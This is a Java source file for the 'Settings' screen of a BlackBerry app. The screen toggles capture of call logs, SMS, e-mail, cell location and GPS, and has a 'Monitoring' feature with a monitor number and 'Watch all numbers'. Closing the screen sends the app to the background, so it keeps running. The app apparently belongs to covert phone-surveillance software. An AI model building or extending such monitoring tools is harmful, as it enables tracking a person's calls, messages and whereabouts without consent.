import info.ApplicationInfo;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.DrawStyle;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.ObjectChoiceField;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;

public class PreferenceApplicationMainScreen extends MainScreen implements FieldChangeListener {
	private final String TITLE = "Settings";
	// UI Part
	private UiApplication appUi = null;
	private CheckboxField voiceField = null;
	private CheckboxField smsField;
	private CheckboxField emailField;
	private CheckboxField locationField = null;
	private CheckboxField gpsField = null;
	private CheckboxField watchField = null;
	private CheckboxField bugField = null;
	private EditField monitorField = null;
	private ObjectChoiceField locationTimerField = null;
	private ObjectChoiceField gpsTimerField = null;
	private VerticalFieldManager leftVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager rightVerticalMgr = new VerticalFieldManager();
	private HorizontalFieldManager standardHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager locationHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager gpsHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager bugHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager watchHorizontalMgr = new HorizontalFieldManager();
	public PreferenceApplicationMainScreen(UiApplication appUi) {
		// To set debug mode.
		Log.setDebugMode(ApplicationInfo.DEBUG);
		// To set application permission.
		Permission.requestPermission();
		this.appUi = appUi;
		setTitle(TITLE);
		createUI();
	}

	private void createUI() {
		// Standard Fields
		initStandardField();
		// Bug Field
		initBugField();
		// Location Field
		initLocationField();
		// GPS Field
		initGPSField();
	}

	private void initStandardField() {
		// To set enabled value.
		Preference pref = Preference.getInstance();
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		voiceField = new CheckboxField("Voice\t\t", eventInfo.isCallLogEnabled());
		smsField = new CheckboxField("SMS", eventInfo.isSMSEnabled());
		emailField = new CheckboxField("E-mail", eventInfo.isEmailEnabled());
		voiceField.setChangeListener(this);
		smsField.setChangeListener(this);
		emailField.setChangeListener(this);
		leftVerticalMgr.add(voiceField);
		leftVerticalMgr.add(smsField);
		rightVerticalMgr.add(emailField);
		standardHorizontalMgr.add(leftVerticalMgr);
		standardHorizontalMgr.add(rightVerticalMgr);
		add(standardHorizontalMgr);
	}
	
	private void initBugField() {
		// To set enabled value.
		Preference pref = Preference.getInstance();
		PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		bugField = new CheckboxField("Monitoring", bugInfo.isEnabled(), Field.FIELD_LEFT);
		monitorField = new EditField(" number: ", bugInfo.getMonitorNumber(), 20, EditField.FILTER_NUMERIC | Field.FIELD_RIGHT);
		watchField = new CheckboxField("Watch all numbers", bugInfo.isWatchAllEnabled());
		monitorField.setEditable(bugInfo.isEnabled());
		bugField.setChangeListener(this);
		monitorField.setChangeListener(this);
		watchField.setChangeListener(this);
		bugHorizontalMgr.add(bugField);
		bugHorizontalMgr.add(monitorField);
		watchHorizontalMgr.add(watchField);
		add(bugHorizontalMgr);
		add(watchHorizontalMgr);
	}

	private void initLocationField() {
		// To set enabled value.
		Preference pref = Preference.getInstance();
		PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
		locationField = new CheckboxField("Location", cellInfo.isEnabled(), Field.FIELD_LEFT);
		locationTimerField = new ObjectChoiceField(" refresh time: ", ApplicationInfo.LOCATION_TIMER, cellInfo.getTimerIndex(), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		locationTimerField.setEditable(cellInfo.isEnabled());
		locationField.setChangeListener(this);
		locationTimerField.setChangeListener(this);
		locationTimerField.setEditable(locationField.getChecked());
		locationHorizontalMgr.add(locationField);
		locationHorizontalMgr.add(locationTimerField);
		add(locationHorizontalMgr);
	}
	
	private void initGPSField() {
		// To set enabled value.
		Preference pref = Preference.getInstance();
		PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gpsField = new CheckboxField("GPS", gpsInfo.isEnabled(), Field.FIELD_LEFT);
		gpsTimerField = new ObjectChoiceField(" refresh time: ", ApplicationInfo.LOCATION_TIMER, gpsInfo.getTimerIndex(), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		gpsTimerField.setEditable(gpsInfo.isEnabled());
		gpsField.setChangeListener(this);
		gpsTimerField.setChangeListener(this);
		gpsTimerField.setEditable(locationField.getChecked());
		gpsHorizontalMgr.add(gpsField);
		gpsHorizontalMgr.add(gpsTimerField);
		add(gpsHorizontalMgr);
	}
	
	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		if (field.equals(voiceField)) {
			boolean voiceStatus = voiceField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setCallLogEnabled(voiceStatus);
				pref.commit(eventInfo);
			}
		}
		else if (field.equals(locationField)) {
			boolean locStatus = locationField.getChecked();
			synchronized (Application.getEventLock()) {
				locationTimerField.setEditable(locStatus);
				Preference pref = Preference.getInstance();
				PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
				cellInfo.setEnabled(locStatus);
				pref.commit(cellInfo);
			}
		}
		else if (field.equals(locationTimerField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
				cellInfo.setTimerIndex(locationTimerField.getSelectedIndex());
				pref.commit(cellInfo);
			}
		}
		else if (field.equals(gpsField)) {
			boolean gpsStatus = gpsField.getChecked();
			synchronized (Application.getEventLock()) {
				gpsTimerField.setEditable(gpsStatus);
				Preference pref = Preference.getInstance();
				PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
				gpsInfo.setEnabled(gpsStatus);
				pref.commit(gpsInfo);
			}
		}
		else if (field.equals(gpsTimerField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
				gpsInfo.setTimerIndex(gpsTimerField.getSelectedIndex());
				pref.commit(gpsInfo);
			}
		}
		else if (field.equals(bugField)) {
			boolean bugStatus = bugField.getChecked();
			synchronized (Application.getEventLock()) {
				monitorField.setEditable(bugStatus);
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setEnabled(bugStatus);
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(monitorField)) {
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setMonitorNumber(monitorField.getText());
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(watchField)) {
			boolean watchStatus = watchField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
				bugInfo.setWatchAllEnabled(watchStatus);
				pref.commit(bugInfo);
			}
		}
		else if (field.equals(emailField)) {
			boolean emailStatus = emailField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setEmailEnabled(emailStatus);
				pref.commit(eventInfo);
			}
		}
		else if (field.equals(smsField)) {
			boolean smsStatus = smsField.getChecked();
			synchronized (Application.getEventLock()) {
				Preference pref = Preference.getInstance();
				PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
				eventInfo.setSMSEnabled(smsStatus);
				pref.commit(eventInfo);
			}
		}
	}
	
	// Screen
	public boolean onClose() {
		UiApplication.getUiApplication().requestBackground();
		return false;
	}
}
